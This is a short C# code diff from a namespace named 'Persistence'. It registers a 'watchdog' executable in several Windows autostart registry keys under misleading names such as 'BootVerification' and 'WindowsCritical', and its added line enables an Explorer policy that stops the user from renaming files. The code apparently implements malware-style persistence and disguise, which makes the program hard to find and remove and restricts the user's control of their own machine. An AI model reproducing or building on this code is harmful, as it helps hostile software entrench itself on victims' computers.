@@ -30,6 +30,7 @@ namespace Persistence
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\WindowsLoad", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRename", 1, RegistryHive.CurrentUser);
             //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
 
 
